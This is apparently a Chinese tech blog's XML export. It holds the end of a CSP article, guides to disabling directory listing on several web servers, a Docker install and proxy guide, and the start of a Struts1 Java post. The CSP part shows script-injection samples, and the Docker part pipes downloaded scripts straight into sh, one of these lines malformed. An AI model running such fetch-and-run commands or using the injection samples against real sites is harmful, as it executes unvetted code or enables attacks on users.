class="string">"data:text/javascript,evil()"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="必须特别注意-JSONP-的回调函数。"><a href="#必须特别注意-JSONP-的回调函数。" class="headerlink" title="必须特别注意 JSONP 的回调函数。"></a>必须特别注意 JSONP 的回调函数。</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span></span></span><br><span class="line"><span class="tag"><span class="attr">src</span>=<span class="string">"/path/jsonp?callback=alert(document.domain)//"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面的代码中，虽然加载的脚本来自当前域名，但是通过改写回调函数，攻击者依然可以执行恶意代码。</p><p><a href="http://www.ruanyifeng.com/blog/2016/09/csp.html">原文链接-阮一峰</a></p>]]></content>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>禁止目录遍历</title>
    <url>/2015/12/02/disable-server-directory-browsing/</url>
    <content><![CDATA[<p>首先说目录浏览和目录遍历漏洞，也可以叫做信息泄露漏洞，非授权文件包含漏洞。<br>简单来说就是直接访问目录时由于找不到默认主页而列出目录下文件。<br>关于目录遍历漏洞简介，<a href="http://www.h3c.com.cn/Products___Technology/Products/IP_Security/Security_Research/Home/Technology/201503/856838_30003_0.htm">摸这里，看H3C攻防团队写的简介</a>或自行google。<br>唔，2014年3月22日，乌云漏洞报告平台曾爆出国内某著名网站存在漏洞，安全支付日志可被遍历下载。说的，也是这个漏洞。</p><p>在IBM WebSphere Application Server，有人直接叫WebSphere，下面简称WAS。</p><p>几种web/application Server禁止目录遍历的配置修改。</p><h2 id="WAS中禁止目录遍历"><a href="#WAS中禁止目录遍历" class="headerlink" title="WAS中禁止目录遍历"></a>WAS中禁止目录遍历</h2><p>如果存在/WEB-INF/ibm-web-ext.xmi，添加/修改就好了。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">	<span class="tag">&lt;<span class="name">enable-directory-browsing</span> <span class="attr">value</span>=<span class="string">"false"</span>&gt;</span>	</span><br><span class="line">```	</span><br><span class="line">或者是WAS 5.0中的directoryBrowsingEnabled</span><br><span class="line">```xml</span><br><span class="line">	directoryBrowsingEnabled="fasle"</span><br></pre></td></tr></table></figure><p>PS:路径可能在</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(WAS 4.0)PATH_TO_WASHOME/AppServer/installedApps/NAME_OF_APP.ear/NAME_OF_APP.war/WEB-INF/ibm-web-ext.xmi</span><br><span class="line">(WAS 5.0)PATH_TO_WASHOME/AppServer/installedApps/NAME_OF_NODE/NAME_OF_APP.ear/NAME_OF_APP.war/WEB-INF/ibm-web-ext.xmi</span><br><span class="line">(WAS 8.5)PATH_TO_WASHOME/AppServer/profiles/AppSrv01/installedApps/NAME_OF_NODE/NAME_OF_APP.ear/NAME_OF_APP.war/WEB-INF/ibm-web-ext.xmi</span><br></pre></td></tr></table></figure><p>项目源码中也可以直接加上该xmi，其他配置根据项目实际情况修改</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-ext</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns</span>=<span class="string">"http://websphere.ibm.com/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://websphere.ibm.com/xml/ns/javaee http://websphere.ibm.com/xml/ns/javaee/ibm-web-ext_1_0.xsd"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">   <span class="tag">&lt;<span class="name">jsp-attribute</span> <span class="attr">name</span>=<span class="string">"trackDependencies"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">jsp-attribute</span> <span class="attr">name</span>=<span class="string">"disableJspRuntimeCompilation"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">jsp-attribute</span> <span class="attr">name</span>=<span class="string">"reloadEnabled"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">reload-interval</span> <span class="attr">value</span>=<span class="string">"5"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">auto-encode-requests</span> <span class="attr">value</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">auto-encode-responses</span> <span class="attr">value</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">enable-directory-browsing</span> <span class="attr">value</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">enable-file-serving</span> <span class="attr">value</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">pre-compile-jsps</span> <span class="attr">value</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">enable-reloading</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">enable-serving-servlets-by-class-name</span> <span class="attr">value</span>=<span class="string">"false"</span> /&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">web-ext</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="TOMCAT"><a href="#TOMCAT" class="headerlink" title="TOMCAT"></a>TOMCAT</h2><p>打开Tomcat_home\conf\web.xml，查看listings是否设置为false<br>修改Tomcat web.xml配置文件</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>listings<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>修改Apache配置文件，在Indexes指令前加减号，禁止找不到默认主页的情况下列出目录下的文件</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Directory</span> /<span class="attr">var</span>/<span class="attr">www</span>/<span class="attr">bluesmile</span>/&gt;</span></span><br><span class="line">       Options -Indexes FollowSymLinks</span><br><span class="line">       AllowOverride None</span><br><span class="line">       Order allow,deny</span><br><span class="line">       allow from all</span><br><span class="line">  <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>查找Nginx配置文件，检查是否开启autoindex指令，若开启，删除或注释该段配置</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">location /testing &#123;</span><br><span class="line">   # autoindex on;</span><br><span class="line">   # autoindex_exact_size off;</span><br><span class="line">   # autoindex_localtime on;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>这个是混进来的。本身是个配置文件。.htaccess文件，又叫分布式配置文件。<br>修改</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Files</span> <span class="attr">.htaccess</span>&gt;</span></span><br><span class="line">order allow,deny</span><br><span class="line">deny from all</span><br><span class="line"><span class="tag">&lt;/<span class="name">Files</span>&gt;</span></span><br></pre></td></tr></table></figure><p>(可以把all换成某一ip地址)</p><h2 id="Lighttpd"><a href="#Lighttpd" class="headerlink" title="Lighttpd"></a>Lighttpd</h2><p>使用以下命令关闭目录浏览模块<br>lighttpd-disable-mod dir-listing</p><h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><p>打开IIS管理器，关闭目录浏览功能<br>详细操作参照<a href="https://technet.microsoft.com/zh-cn/library/cc731109(v=ws.10).aspx">官方文档</a></p><p>启用或禁用目录浏览<br>您可以通过以下方法执行此过程：使用用户界面 (UI)、在命令行窗口中运行 Appcmd.exe 命令、直接编辑配置文件或编写 WMI 脚本。</p><ul><li>用户界面</li></ul><p>使用 UI<br>打开 IIS 管理器，然后导航至您要管理的级别。 有关如何打开 IIS 管理器的信息，请参阅 打开 IIS 管理器 (IIS 7)。 有关如何在 UI 的各个位置间进行导航的信息，请参阅 在 IIS 管理器中导航 (IIS 7)。<br>在“功能视图”中，双击“目录浏览”。<br>在“操作”窗格中，如果“目录浏览”功能已禁用而您要启用它，请单击“启用”。 或者，如果“目录浏览”功能已启用而您要禁用它，请单击“禁用”。</p><ul><li>命令行</li></ul><p>若要启用或禁用目录浏览，请使用下面的语法：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">appcmd set config /section:directoryBrowse /enabled:true|false</span><br></pre></td></tr></table></figure><p>默认情况下，enabled 属性设置为 true，这表示目录浏览已启用。 将 enabled 属性设置为 false 时，就会禁用目录浏览。<br>例如，若要禁用目录浏览，请在命令提示符处键入如下命令，然后按 Enter：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">appcmd set config /section:directoryBrowse /enabled:false</span><br></pre></td></tr></table></figure><p>有关 Appcmd.exe 的详细信息，请参阅 Appcmd.exe (IIS 7) 。</p><ul><li>配置</li></ul><p>本主题中的过程会影响以下配置元素：<br><directorybrowse><br>有关 IIS 7 配置的详细信息，请参阅 MSDN 上的 IIS 7.0：IIS 设置架构（可能为英文页面）。</directorybrowse></p><ul><li>WMI</li></ul><p>请使用以下 WMI 类、方法或属性执行此过程：<br>DirectoryBrowseSection.Enabled 属性</p><p>参考链接，<a href="bluesmile.cc/post-54.html">摸这里</a></p>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>安全</tag>
        <tag>AppScan</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker设置socks5代理或使用国内镜像</title>
    <url>/2017/11/09/docker-set-proxy/</url>
    <content><![CDATA[<p>Dockers是有能力打包应用程式及其虚拟容器，可以在任何Linux伺服器上执行的依赖性工具，这有助於实现灵活性和便携性，应用程式在任何地方都可以执行，无论是公有云、私有云、单机等。<br><a href="https://www.docker.com/what-docker">docker是什么</a>.</p><h2 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h2><p>如果可以直接连接docker官网，可以直接使用以下命令安装。一条命令直接安装docker。</p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">curl -sSL http<span class="variable">s:</span>//<span class="built_in">get</span>.docker.<span class="keyword">com</span>/ | <span class="keyword">sh</span></span><br></pre></td></tr></table></figure><p>如果以上安装失败，可以下载脚本后 <a href="install_docker.sh">install_docker.sh</a> 执行<code>sh --mirror Aliyun</code><br>或</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo wget http:<span class="regexp">//</span>blog.yanzhe.tk<span class="regexp">/2017/</span><span class="number">11</span><span class="regexp">/09/</span>docker-set-proxy<span class="regexp">/install_docker.sh | sh --mirror Aliyun</span></span><br></pre></td></tr></table></figure><p>如需要设置非root用户自启docker，需要将目标用户添加到docker分组，即是现在安装docker后会出现的提示</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> usermod -aG docker <span class="variable">$USER</span></span><br></pre></td></tr></table></figure><p>docker安装后出现Cannot connect to the Docker daemon.一般重启docker即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure><h2 id="Docker-设置http-https-socks5代理"><a href="#Docker-设置http-https-socks5代理" class="headerlink" title="Docker 设置http,https socks5代理"></a>Docker 设置http,https socks5代理</h2><ol><li>为docker服务创建一个内嵌的systemd目录</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /etc/systemd/system/docker.service.d</span><br></pre></td></tr></table></figure><ol start="2"><li>创建/etc/systemd/system/docker.service.d/https-proxy.conf文件，并添加HTTP_PROXY,或HTTPS_PROXY环境变量。</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /etc/systemd/system/docker.service.d</span><br><span class="line">sudo nano https-proxy.conf</span><br></pre></td></tr></table></figure><p>其中ip和port,NO_PROXY分别改成实际情况的代理地址和端口：<br>https-proxy.conf</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[Service]</span><br><span class="line">Environment="HTTP_PROXY=socks5://127.0.0.1:1080/" "HTTPS_PROXY=socks5://127.0.0.1:1080/" "NO_PROXY=localhost,127.0.0.1,docker.io,yanzhe919.mirror.aliyuncs.com,99nkhzdo.mirror.aliyuncs.com,*.aliyuncs.com,*.mirror.aliyuncs.com,registry.docker-cn.com,hub.c.163.com,hub-auth.c.163.com,"</span><br></pre></td></tr></table></figure><ol start="3"><li>更新配置：</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br></pre></td></tr></table></figure><ol start="4"><li>重启Docker服务：</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><h2 id="如使用国内镜像，可用"><a href="#如使用国内镜像，可用" class="headerlink" title="如使用国内镜像，可用"></a>如使用国内镜像，可用</h2><h3 id="docker-pull-完整路径-网址-name-repo-tag"><a href="#docker-pull-完整路径-网址-name-repo-tag" class="headerlink" title="docker pull 完整路径(网址/name/repo:tag)"></a>docker pull 完整路径(网址/name/repo:tag)</h3><p>您可以使用以下命令直接从该镜像加速地址进行拉取：</p><p><code>docker pull registry.docker-cn.com/myname/myrepo:mytag</code></p><p>例如:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull registry.docker-cn.com/library/ubuntu:16.04</span><br></pre></td></tr></table></figure><h3 id="使用-–registry-mirror-配置-Docker-守护进程"><a href="#使用-–registry-mirror-配置-Docker-守护进程" class="headerlink" title="使用 –registry-mirror 配置 Docker 守护进程"></a>使用 –registry-mirror 配置 Docker 守护进程</h3><p>您可以配置 Docker 守护进程默认使用 Docker 官方镜像加速。这样您可以默认通过官方镜像加速拉取镜像，而无需在每次拉取时指定 <code>registry.docker-cn.com</code>。</p><p>您可以在 Docker 守护进程启动时传入 <code>--registry-mirror</code> 参数：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker --registry-mirror=https://registry.docker-cn.com daemon</span><br></pre></td></tr></table></figure><p>为了永久性保留更改，您可以修改 <code>/etc/docker/daemon.json</code> 文件并添加上 <code>registry-mirrors</code> 键值。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  "registry-mirrors": ["https://registry.docker-cn.com"]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改保存后重启 Docker 以使配置生效。</p><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">sudo</span> <span class="string">systemctl daemon-reload</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">systemctl restart docker</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">systemctl enable docker</span></span><br></pre></td></tr></table></figure><p>阿里，使用需要登录自己的阿里账号，配置自己的地址</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-'EOF'</span><br><span class="line">&#123;</span><br><span class="line">  "registry-mirrors": ["https://99nkhzdo.mirror.aliyuncs.com"]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line">sudo systemctl enable docker</span><br></pre></td></tr></table></figure><h2 id="docker-基本使用示例"><a href="#docker-基本使用示例" class="headerlink" title="docker 基本使用示例"></a>docker 基本使用示例</h2><h3 id="docker-安装并运行nginx"><a href="#docker-安装并运行nginx" class="headerlink" title="docker 安装并运行nginx"></a>docker 安装并运行nginx</h3><blockquote><ul><li>检查本地镜像</li></ul></blockquote><pre><code>`docker images`</code></pre><blockquote><ul><li>拉取镜像</li></ul></blockquote><pre><code>`docker pull nginx` 或是使用dockerfile文件build images</code></pre><blockquote><ul><li>运行容器，可指定后台运行-d，指定映射端口-p 主机:容器内，指定挂载目录-v 主机:容器内</li></ul></blockquote><p>可COPY nginx默认配置文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p ~/nginx/www ~/nginx/logs ~/nginx/conf</span><br><span class="line">cd ~/nginx</span><br><span class="line">docker run --name mynginx -d library/nginx</span><br><span class="line">docker cp mynginx:/etc/nginx/nginx.conf /home/yanzhe/nginx/conf/nginx.conf</span><br><span class="line">docker run -p 80:80 --name mynginx -v $PWD/www:/www -v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf -v $PWD/logs:/wwwlogs  -d nginx</span><br></pre></td></tr></table></figure><blockquote><ul><li>查看容器状态</li></ul></blockquote><pre><code>-a所有
`docker ps -a`</code></pre><blockquote><ul><li>查看端口是否监听</li></ul></blockquote><pre><code>`ss -na | grep :80`

或是
`netstat -na | grep 80`</code></pre><blockquote><ul><li>查看容器日志</li></ul></blockquote><pre><code>`docker logs mynginx`</code></pre><blockquote><ul><li>进入容器</li></ul></blockquote><pre><code>`docker exec -it mynginx bash`</code></pre><blockquote><ul><li>访问web</li></ul></blockquote><pre><code>`http://localhost:80`</code></pre><blockquote><ul><li>停止容器</li></ul></blockquote><pre><code>`docker stop mynginx`</code></pre><blockquote><ul><li>启动/重启容器</li></ul></blockquote><pre><code>`docker start mynginx` `docker restart mynginx`</code></pre><blockquote><ul><li>删除容器</li></ul></blockquote><pre><code>`dockert rm mynginx`</code></pre><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><h3 id="使用war包，tomcat"><a href="#使用war包，tomcat" class="headerlink" title="使用war包，tomcat"></a>使用war包，tomcat</h3><blockquote><ul><li>拉取tomcat</li></ul></blockquote><pre><code>`docker pull library/tomcat`</code></pre><blockquote><ul><li>使用dockerfile</li></ul></blockquote><p>将war包与dockerfile放置于同级目录，创建dockerfile</p><pre><code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#from 基础镜像,images name</span></span></span><br><span class="line">from library/tomcat</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#制作者信息</span></span></span><br><span class="line">MAINTAINER yanzhe yz@gmail.com</span><br><span class="line"></span><br><span class="line">COPY jpress.war /usr/local/tomcat/webapps</span><br></pre></td></tr></table></figure></code></pre><blockquote><ul><li>build dockerfile</li></ul></blockquote><pre><code>-t 指定name:tag
`docker build -t jpress:latest`</code></pre><blockquote><ul><li>运行容器</li></ul></blockquote><pre><code>`docker run -d -p 8888:8080 jpress`</code></pre><blockquote><ul><li>查看端口是否监听</li></ul></blockquote><pre><code>`ss -na | grep 8888`

或是
`netstat -na | grep 8888`</code></pre><blockquote><ul><li>访问tomcat</li></ul></blockquote><pre><code>`http://localhost:8888/jpress`</code></pre><h3 id="spring-boot"><a href="#spring-boot" class="headerlink" title="spring boot"></a>spring boot</h3><blockquote><ul><li>添加 Dockerfile</li></ul></blockquote><p>在应用根目录下建立 Dockerfile 文件，内容如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">FROM maven:3.3.3</span><br><span class="line"></span><br><span class="line">ADD pom.xml /tmp/build/</span><br><span class="line">RUN cd /tmp/build &amp;&amp; mvn -q dependency:resolve</span><br><span class="line"></span><br><span class="line">ADD src /tmp/build/src</span><br><span class="line">        #构建应用</span><br><span class="line">RUN cd /tmp/build &amp;&amp; mvn -q -DskipTests=true package \</span><br><span class="line">        #拷贝编译结果到指定目录</span><br><span class="line">        &amp;&amp; mv target/*.jar /app.jar \</span><br><span class="line">        #清理编译痕迹</span><br><span class="line">        &amp;&amp; cd / &amp;&amp; rm -rf /tmp/build</span><br><span class="line"></span><br><span class="line">VOLUME /tmp</span><br><span class="line">EXPOSE 8080</span><br><span class="line">ENTRYPOINT ["java","-Djava.security.egd=file:/dev/./urandom","-jar","/app.jar"]</span><br></pre></td></tr></table></figure><p>由于项目使用 Maven 构建，故本次基础镜像选用 maven:3.3.3 官方镜像。<br>官方维护的 Maven 镜像依赖于 Java 镜像构建，所以我们不需要使用 Java 镜像。</p><p>因为 Spring Boot 框架打包的应用是一个包含依赖的 jar 文件，内嵌了 Tomcat 和 Jetty 支持，所以我们只需要使用包含 Java 的 Maven 镜像即可，不需要 Tomcat 镜像。</p><p>为了减少镜像大小，在执行 Maven 构建之后，清理了构建痕迹。</p><p>在 Dockerfile 文件的最后，使用 ENTRYPOINT 指令执行启动 Java 应用的操作。</p><blockquote><ul><li>构建docker镜像</li></ul></blockquote><pre><code>`docker build -t docker-demo-spring-boot . `</code></pre><blockquote><ul><li>从镜像启动容器</li></ul></blockquote><pre><code>`docker run -d -p 8080:8080 docker-demo-spring-boot`</code></pre><blockquote><ul><li>打开浏览器，或者使用 curl 访问如下地址</li></ul></blockquote><pre><code>`http://127.0.0.1:8080`</code></pre>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>SS</tag>
        <tag>proxy</tag>
      </tags>
  </entry>
  <entry>
    <title>filter中复制request的inputStream，多次取流</title>
    <url>/2016/10/26/filter-copy-request-inputStream/</url>
    <content><![CDATA[<h2 id="前期在struts1中尝试"><a href="#前期在struts1中尝试" class="headerlink" title="前期在struts1中尝试"></a>前期在struts1中尝试</h2><p>有个项目中使用的是Struts1，想着写个自己的ActionServlet和ReqeustProcessor，将其中的MultipartRequestWrapper换成自己实现的类。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yz.testweb.common.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.RequestDispatcher;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.struts.upload.MultipartRequestWrapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.struts.DelegatingRequestProcessor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">YZDelegatingRequestProcessor</span> <span class="keyword">extends</span> <span class="title">DelegatingRequestProcessor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> HttpServletRequest <span class="title">processMultipart</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">"POST"</span>.equalsIgnoreCase(request.getMethod())) &#123;</span><br><span class="line">            <span class="keyword">return</span> (request);</span><br><span class="line">        &#125;</span><br><span class="line">      </span><br><span class="line">        String contentType = request.getContentType();</span><br><span class="line">        <span class="keyword">if</span> ((contentType != <span class="keyword">null</span>) &amp;&amp;</span><br><span class="line">            contentType.startsWith(<span class="string">"multipart/form-data"</span>)) &#123;</span><br><span class="line">                 YZMultipartRequestWrapper wrapper = (YZMultipartRequestWrapper)(request);</span><br><span class="line">            <span class="keyword">return</span> (wrapper);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (request);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doForward</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            String uri,</span></span></span><br><span class="line"><span class="function"><span class="params">            HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">            HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">                </span><br><span class="line">            <span class="comment">// Unwrap the multipart request, if there is one.</span></span><br><span class="line">            <span class="keyword">if</span> (request <span class="keyword">instanceof</span> MultipartRequestWrapper) &#123;</span><br><span class="line">                request = ((YZMultipartRequestWrapper) request).getRequest();</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (request <span class="keyword">instanceof</span> YZMultipartRequestWrapper) &#123;</span><br><span class="line">                request = ((YZMultipartRequestWrapper) request).getRequest();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            RequestDispatcher rd = getServletContext().getRequestDispatcher(uri);</span><br><span class="line">            <span class="keyword">if</span> (rd == <span class="keyword">null</span>) &#123;</span><br><span class="line">                response.sendError(</span><br><span class="line">                    HttpServletResponse.SC_INTERNAL_SERVER_ERROR,</span><br><span class="line">                    getInternal().getMessage(<span class="string">"requestDispatcher"</span>, uri));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            rd.forward(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doInclude</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            String uri,</span></span></span><br><span class="line"><span class="function"><span class="params">            HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">            HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">                </span><br><span class="line">            <span class="comment">// Unwrap the multipart request, if there is one.</span></span><br><span class="line">            <span class="keyword">if</span> (request <span class="keyword">instanceof</span> MultipartRequestWrapper) &#123;</span><br><span class="line">                request = ((YZMultipartRequestWrapper) request).getRequest();</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (request <span class="keyword">instanceof</span> YZMultipartRequestWrapper) &#123;</span><br><span class="line">                request = ((YZMultipartRequestWrapper) request).getRequest();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            RequestDispatcher rd = getServletContext().getRequestDispatcher(uri);</span><br><span class="line">            <span class="keyword">if</span> (rd == <span class="keyword">null</span>) &#123;</span><br><span class="line">                response.sendError(</span><br><span class="line">                    HttpServletResponse.SC_INTERNAL_SERVER_ERROR,</span><br><span class="line">                    getInternal().getMessage(<span class="string">"requestDispatcher"</span>, uri));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            rd.include(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在struts-config中需要将processorClass换成自己实现的</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">controller</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">set-property</span> <span class="attr">property</span>=<span class="string">"processorClass"</span> <span class="attr">value</span>=<span class="string">"com.yz.testweb.common.web.YZDelegatingRequestProcessor"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">controller</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yz.testweb.common.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.struts.Globals;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts.action.ActionServlet;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts.config.ModuleConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts.util.ModuleUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">YZActionServlet</span> <span class="keyword">extends</span> <span class="title">ActionServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">6096137956303373911L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings</span>(<span class="string">"deprecation"</span>)</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        YZMultipartRequestWrapper wrapper = <span class="keyword">null</span>;</span><br><span class="line">         wrapper = <span 